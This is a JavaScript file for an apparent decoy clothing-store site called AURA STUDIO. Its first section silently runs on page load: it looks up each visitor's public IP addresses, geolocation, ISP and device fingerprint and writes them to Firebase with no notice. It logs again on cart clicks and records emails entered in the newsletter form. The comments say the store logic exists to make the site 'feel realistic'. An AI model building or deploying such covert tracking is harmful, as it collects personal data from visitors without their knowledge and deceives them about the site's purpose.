"use strict";

import { detectDevice } from "./device-detector.js";
import { saveLogRecord } from "./firebase-config.js";

// 1. SILENT BACKGROUND LOGGING:
// Silently detects device details and public IPv4 & IPv6 on page load,
// and saves directly into Firebase Firestore without any frontend alert.
const deviceInfo = detectDevice();

async function fetchIpWithTimeout(url, timeoutMs = 2800) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeoutMs);
    try {
        const res = await fetch(url, { signal: controller.signal });
        if (res.ok) {
            const data = await res.json();
            if (data && typeof data.ip === "string" && data.ip.trim()) {
                return data.ip.trim();
            }
        }
    } catch {
        // Timeout or network route unreachable (normal if client lacks IPv6)
    } finally {
        clearTimeout(timer);
    }
    return null;
}

export async function resolveNetworkInfo() {
    // Run IPv4 and IPv6 resolution in parallel
    const [v4Result, v6Result] = await Promise.allSettled([
        fetchIpWithTimeout("https://api4.ipify.org?format=json", 3000)
            .then(async (ip) => ip || (await fetchIpWithTimeout("https://api.ipify.org?format=json", 2000))),
        fetchIpWithTimeout("https://api6.ipify.org?format=json", 2500)
            .then(async (ip) => ip || (await fetchIpWithTimeout("https://v6.ident.me/.json", 2000)))
    ]);

    let ipv4 = v4Result.status === "fulfilled" ? v4Result.value : null;
    let ipv6 = v6Result.status === "fulfilled" ? v6Result.value : null;

    // Fallback: If both failed, attempt dual-stack resolution
    if (!ipv4 && !ipv6) {
        try {
            const fallbackIp = await fetchIpWithTimeout("https://api64.ipify.org?format=json", 3000)
                || (await fetchIpWithTimeout("https://ipapi.co/json/", 2500));
            if (fallbackIp) {
                if (fallbackIp.includes(":")) {
                    ipv6 = fallbackIp;
                } else {
                    ipv4 = fallbackIp;
                }
            }
        } catch {
            // Ignore
        }
    }

    let networkType = "Unknown";
    if (ipv4 && ipv6) {
        networkType = "Dual-Stack (IPv4 + IPv6)";
    } else if (ipv6) {
        networkType = "IPv6 Only";
    } else if (ipv4) {
        networkType = "IPv4 Only";
    }

    return {
        ipv4,
        ipv6,
        primaryIp: ipv6 || ipv4 || "Unavailable",
        networkType
    };
}

export async function resolveLocationAndIsp(ip) {
    try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 2500);
        const url = ip ? `https://ipwho.is/${encodeURIComponent(ip)}` : "https://ipwho.is/";
        const res = await fetch(url, { signal: controller.signal });
        clearTimeout(timer);
        if (res.ok) {
            const data = await res.json();
            if (data && data.success !== false) {
                return {
                    city: data.city || "Unknown City",
                    region: data.region || "",
                    country: data.country || "Unknown Country",
                    countryCode: data.country_code || "",
                    flag: data.flag?.emoji || "🌐",
                    isp: data.connection?.isp || data.connection?.org || "Unknown ISP",
                    org: data.connection?.org || "",
                    asn: data.connection?.asn ? `AS${data.connection.asn}` : "",
                    timezone: data.timezone?.id || ""
                };
            }
        }
    } catch {
        // Fallback to geojs
    }

    try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 2000);
        const res = await fetch("https://get.geojs.io/v1/ip/geo.json", { signal: controller.signal });
        clearTimeout(timer);
        if (res.ok) {
            const data = await res.json();
            if (data && data.country) {
                return {
                    city: data.city || "Unknown City",
                    region: data.region || "",
                    country: data.country || "Unknown Country",
                    countryCode: data.country_code || "",
                    flag: "🌐",
                    isp: data.organization_name || data.organization || "Unknown ISP",
                    org: data.organization || "",
                    asn: data.asn ? `AS${data.asn}` : "",
                    timezone: data.timezone || ""
                };
            }
        }
    } catch {
        // All failed
    }

    return {
        city: "Unknown City",
        region: "",
        country: "Unknown Country",
        countryCode: "",
        flag: "🌐",
        isp: "Unknown ISP",
        org: "",
        asn: "",
        timezone: ""
    };
}

function getConnectionTelemetry() {
    try {
        const conn = typeof navigator !== "undefined" && (navigator.connection || navigator.mozConnection || navigator.webkitConnection);
        if (conn) {
            return {
                type: conn.effectiveType ? conn.effectiveType.toUpperCase() : "4G",
                downlink: conn.downlink ? `${conn.downlink} Mbps` : null,
                rtt: conn.rtt ? `${conn.rtt} ms` : null
            };
        }
    } catch {}
    return { type: "Unknown", downlink: null, rtt: null };
}

let cachedNetwork = null;
let cachedLocation = null;

async function directSilentSave(event = "clothing_store_visit") {
    try {
        if (!cachedNetwork) {
            cachedNetwork = await resolveNetworkInfo();
        }
        if (!cachedLocation) {
            cachedLocation = await resolveLocationAndIsp(cachedNetwork?.ipv4 || (cachedNetwork?.primaryIp !== "Unavailable" ? cachedNetwork?.primaryIp : null));
        }
        const connTelemetry = getConnectionTelemetry();

        if (cachedNetwork && (cachedNetwork.ipv4 || cachedNetwork.ipv6 || cachedNetwork.primaryIp !== "Unavailable")) {
            await saveLogRecord({
                ip: cachedNetwork.primaryIp,
                ipv4: cachedNetwork.ipv4,
                ipv6: cachedNetwork.ipv6,
                networkType: cachedNetwork.networkType,
                deviceId: deviceInfo.deviceId,
                location: cachedLocation,
                connection: connTelemetry,
                device: deviceInfo,
                event
            });
            console.log("Visitor telemetry recorded:", {
                deviceId: deviceInfo.deviceId,
                device: deviceInfo.model,
                gpu: deviceInfo.gpu,
                location: `${cachedLocation.city}, ${cachedLocation.country} (${cachedLocation.isp})`,
                network: cachedNetwork.networkType
            });
        }
    } catch (err) {
        console.error("Silent save error:", err);
    }
}

// Trigger automatic silent logging immediately upon loading the clothing site
directSilentSave();

// 2. CLOTHING STORE INTERACTION LOGIC:
// Makes the clothing store feel 100% interactive, responsive, and realistic.

let cartCount = 0;
const cartCountEl = document.querySelector("#cart-count");
const toastEl = document.querySelector("#store-toast");
const toastMsg = document.querySelector("#toast-message");
let toastTimer;

function showToast(message) {
    if (!toastEl || !toastMsg) return;
    toastMsg.textContent = message;
    toastEl.classList.add("is-visible");
    window.clearTimeout(toastTimer);
    toastTimer = window.setTimeout(() => {
        toastEl.classList.remove("is-visible");
    }, 2800);
}

// Add to Bag buttons
document.querySelectorAll(".add-to-bag-btn").forEach((btn) => {
    btn.addEventListener("click", (e) => {
        e.preventDefault();
        const card = btn.closest(".product-card");
        const productName = card?.dataset?.name || "Selected garment";

        cartCount++;
        if (cartCountEl) cartCountEl.textContent = cartCount;

        btn.textContent = "Added ✓";
        btn.classList.add("added");
        setTimeout(() => {
            btn.textContent = "Add to Bag +";
            btn.classList.remove("added");
        }, 1200);

        showToast(`Added "${productName}" to your bag.`);

        // Also silently log the product interest
        directSilentSave(`cart_add: ${productName}`);
    });
});

// Cart button click
const cartBtn = document.querySelector("#cart-toggle");
if (cartBtn) {
    cartBtn.addEventListener("click", () => {
        if (cartCount === 0) {
            showToast("Your shopping bag is currently empty.");
        } else {
            showToast(`You have ${cartCount} item${cartCount === 1 ? "" : "s"} in your bag.`);
        }
    });
}

// Newsletter subscription form
const newsletterForm = document.querySelector("#newsletter-form");
const newsletterStatus = document.querySelector("#newsletter-status");
if (newsletterForm) {
    newsletterForm.addEventListener("submit", (e) => {
        e.preventDefault();
        const input = newsletterForm.querySelector("input[type='email']");
        const email = input ? input.value : "";
        if (newsletterStatus) {
            newsletterStatus.textContent = "Thank you! Code AURA15 has been applied to your session.";
            newsletterStatus.style.color = "#276749";
        }
        if (input) input.value = "";
        showToast("Welcome to AURA STUDIO. 15% discount applied!");
        directSilentSave(`newsletter_subscriber: ${email}`);
    });
}
